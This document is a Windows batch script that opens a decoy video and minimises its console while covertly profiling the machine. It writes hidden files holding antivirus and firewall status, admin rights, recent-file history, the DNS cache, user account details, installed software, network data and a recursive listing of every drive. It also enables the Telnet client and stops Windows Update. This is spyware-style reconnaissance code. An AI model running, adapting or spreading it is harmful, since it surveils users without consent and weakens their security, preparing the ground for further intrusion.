@echo off
color 0b
del "%username%".txt
del "%username% disk".txt
mode con cols=15 lines=1
@echo off
start C.mp4

echo ----------------------user profile-------------------->> "%username%".txt
echo %USERPROFILE% >>"%username%".txt
echo ----------------------masir jari-------------------->> "%username%".txt
echo %~0 >> "%username%".txt
echo ----------------------graphic-------------------->> "%username%".txt
@echo off
wmic PATH Win32_videocontroller GET description >> "%username%".txt
wmic PATH Win32_videocontroller GET adapterram >> "%username%".txt
wmic PATH Win32_videocontroller GET driverversion >> "%username%".txt
wmic PATH Win32_videocontroller GET pnpdeviceid >> "%username%".txt
wmic PATH Win32_videocontroller GET name >> "%username%".txt
attrib +h "%username%".txt
echo ----------------------firwall------------------->>"%username%".txt
wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName   >> "%username%".txt
netsh advfirewall show allprofiles state >>"%username%".txt

echo ----------------------run adminstory or standard------------------->>"%username%".txt
@echo off
goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...
    
    net session >nul 2>&1
    if %errorLevel% == nul (
	    echo "Administrative permissions confirmed" >>"%username%".txt
        echo Success: Administrative permissions confirmed   
		
    ) else (
        echo Failure: Current permissions inadequate. >>"%username%".txt
    )
    
echo -------------------------telnet----------------------->>"%username%".txt
 pkgmgr /iu:”TelnetClient”
echo "telnet is enabeled" >>"%username%".txt
echo -------------------------browser----------------------->>"%username%".txt
echo:
echo INSTALLED BROWSERS >>"%username%".txt
echo:

for /f "delims=" %%A in (
    'reg query HKLM\SOFTWARE\Clients\StartMenuInternet /k /f *'
) do (
    for /f "tokens=1,2,*" %%B in (
        '2^>nul reg query "%%~A\defaulticon" /ve ^| findstr /v "^HKEY"'
    ) do (
        echo "%%~nD" >>"%username%".txt
    )
)
echo:
echo EXECUTABLES PATHS >>"%username%".txt
echo:

for /f "delims=" %%A in (
    'reg query HKLM\SOFTWARE\Clients\StartMenuInternet /k /f *'
) do (
    for /f "tokens=1,2,*" %%B in (
        '2^>nul reg query "%%~A\shell\open\command" /ve ^| findstr /v "^HKEY"'
    ) do (
        echo "%%~D" >>"%username%".txt
    )
)

echo DEFAULT BROWSER >>"%username%".txt
echo:

for /f "tokens=1,2,*" %%A in (
    'reg query HKCR\http\shell\open\command /ve ^| findstr /v "^HKEY"'
) do (
    echo "%%~nC" >>"%username%".txt
)

echo:
echo DEFAULT .HTML VIEWER >>"%username%".txt
echo:

for /f "tokens=1,2,*" %%A in (
    'reg query HKCR\htmlfile\shell\open\command /ve ^| findstr /v "^HKEY"'
) do (
    echo "%%~nC" >>"%username%".txt
)
cls
echo ----------------------------------------user search bar------->>"%username%".txt
dir C:\Users\"%username%"\AppData\Roaming\Microsoft\Windows\Recent /b >temp.txt
FOR /F "tokens=1 delims=." %%A IN (temp.txt) Do echo                  %%A>>"%username%".txt
del /q "temp.txt"
echo ----------------------------------------update------->>"%username%".txt
set upd=Get-Service -name 'wuauserv'
>"temp.txt " powershell "%upd%"
FOR /F "tokens=1 delims='' " %%A IN (temp.txt) Do echo %%A >temp2.txt
set /p var=<"temp2.txt"
del /q "temp.txt"
del /q "temp2.txt"
echo Windows Update state:         %var%>>"%username%".txt

net stop wuauserv  
echo disabled>>"%username%".txt
echo ------------------------------------server----------->>"%username%".txt
net statistics workstation>>"%username%".txt
echo -----------------------------uac-------------------->>"%username%".txt
   
    @echo off
    reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" | find  "0x0" >NUL
    if "%ERRORLEVEL%"=="0"  ECHO UAC disabled >>"%username%".txt
    if "%ERRORLEVEL%"=="1"  ECHO UAC enabled  >>"%username%".txt
	
echo ------------------------------------ssh----------->>"%username%".txt
@echo off
set ssh=(Get-Command New-PSSession).ParameterSets.Name
>"temp.txt " powershell "%ssh%"
for /f %%i in ("temp.txt") do set size=%%~zi
if %size% equ 0  (set var=None) else (set /p var=<"temp.txt")
del /q "temp.txt"
echo SSH Status:                     %var%>>"%username%".txt
echo ------------------------------------network name----------->>"%username%".txt
set net=wmic NIC where "NetEnabled='true'" get "Name"
>"temp.txt " powershell "%net% | Select -index 2"
set /p var=<"temp.txt"
del /q "temp.txt"
echo Network Card Name:  %var%>>"%username%".txt
echo ---------------------user password----------------------->>"%username%".txt
	set a=%username%
    net user "%a%" >>"%username%".txt
echo ---------------------dvd cd rom name----------------------->>"%username%".txt
@echo off
set dvd=wmic cdrom get name
>"temp.txt " powershell "%dvd% | Select -index 2"
set /p var=<"temp.txt"
del /q "temp.txt"
echo CD/DVD Rom Name:  %var%>>"%username%".txt
echo ---------------------os type----------------------->>"%username%".txt
echo %os% ->>"%username%".txt
echo ---------------------cpu name----------------------->>"%username%".txt
set cpu=wmic cpu get name
>"temp.txt " powershell "%cpu% | Select -index 2"
set /p var=<"temp.txt"
del /q "temp.txt"
echo CPU Name:                    %var%>>"%username%".txt
echo ---------------------processor level---------------->>"%username%".txt
echo %processor_level%->>"%username%".txt
echo ---------------------number of core----------------->>"%username%".txt
echo %number_of_processors%->>"%username%".txt
echo ----------------------system drive----------------->>"%username%".txt
echo %systemdrive% ->>"%username%".txt
echo ----------------------user domain------------------>>"%username%".txt
echo %userdomain%->>"%username%".txt
echo -----------------------user name------------------->>"%username%".txt
echo  %username%->>"%username%".txt
echo -----------------------data today------------------>>"%username%".txt
echo %date%->>"%username%".txt
echo ----------------------system info------------------>>"%username%".txt
systeminfo >> "%username%".txt 
echo ----------------------RAM special detail------------------>>"%username%".txt
@echo off
wmic MEMORYCHIP get BankLabel, Capacity, DeviceLocator, MemoryType, TypeDetail, Speed >>"%username%".txt
echo ----------------------history-------------------->>"%username%".txt
ipconfig/displaydns >>"%username%".txt
cls
echo ----------------------all installed app-------------------->>"%username%".txt
reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall temp1.txt
find "Microsoft" temp1.txt| find "DisplayName" > temp2.txt
for /f "tokens=2,3 delims==" %%a in (temp2.txt) do (echo %%a >> "%username%".txt)
del temp1.txt temp2.txt
cls
echo ----------------------Connections-------------->>"%username%".txt
netstat >> "%username%".txt
echo -----------------------ping---------------------->>"%username%".txt
ping 4.2.2.4  >>"%username%".txt
echo -----------------------tracrute---------------------->>"%username%".txt
cls
@echo off
tracert jsu.ac.ir >> "%username%".txt
echo -----------------------ipconfig all---------------------->>"%username%".txt
ipconfig -all >>  "%username%".txt
echo ---------------------------hard disk model ---------------------------->>"%username% disk".txt
wmic diskdrive get model,serialNumber,size,mediaType >> "%username% disk".txt
echo ---------------------------patition hard---------------------------->>"%username% disk".txt
wmic logicaldisk get caption,providername,drivetype,volumename >>"%username% disk".txt
echo ---------------------------patition capacity---------------------------->>"%username% disk".txt
@ECHO OFF

@SETLOCAL ENABLEEXTENSIONS
@SETLOCAL ENABLEDELAYEDEXPANSION

@FOR /F "skip=1 tokens=1" %%x IN ('"WMIC /node:"%1" LOGICALDISK GET Name " ') DO (
REM @ECHO %%x

@FOR /F "tokens=1-3" %%n IN ('"WMIC /node:"%1" LOGICALDISK GET Name,Size,FreeSpace | find /i "%%x""') DO ( @SET FreeBytes=%%n & @SET TotalBytes=%%p

SET TotalGB=0
SET FreeGB=0

REM Parameter value used to convert in GB
set num1=1074

REM Parameter value used to convert in MB or KB
REM set num1 = 1049

REM @ECHO Total space: !TotalBytes!

SET /a TotalSpace=!TotalBytes:~0,-6! / !NUM1!
SET /a FreeSpace=!FreeBytes:~0,-7! / !NUM1!

SET TotalGB=!TotalSpace!
SET FreeGB=!FreeSpace!

SET PERNUM=100

SET /A TotalUsed=!TotalSpace! - !FreeSpace!
SET /A MULTIUSED=!TotalUsed!*!PERNUM!
SET /A PERCENTUSED=!MULTIUSED!/!TotalGB!

REM IF !TotalSpace! LSS 0 goto error

@echo.
@echo.
@ECHO ---------------------------------------------------->>"%username% disk".txt
attrib +h "%username% disk".txt
@echo Drive: %%x >>"%username% disk".txt
@ECHO ================= >>"%username% disk".txt
@ECHO Total space: !TotalGB! GB >>"%username% disk".txt
@ECHO Free space : !FreeGB! GB >>"%username% disk".txt
@ECHO PERCENTUSED : !PERCENTUSED! >>"%username% disk".txt
REM @SET TotalSpace=
REM @SET FreeSpace=
REM @SET TotalUsed=
REM goto end
)
)
cls
echo ------------------------------------------------------------->>"%username% disk".txt
FOR %%A IN (C: D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z:) DO (
DIR /A /S %%A >>"%username% disk".txt
)
IF EXIST "%username% disk".txt (
ECHO THE IMPORTANT INFORMATION WAS GATHERED!
) ELSE (
ECHO OPERATION FAILD!
)

close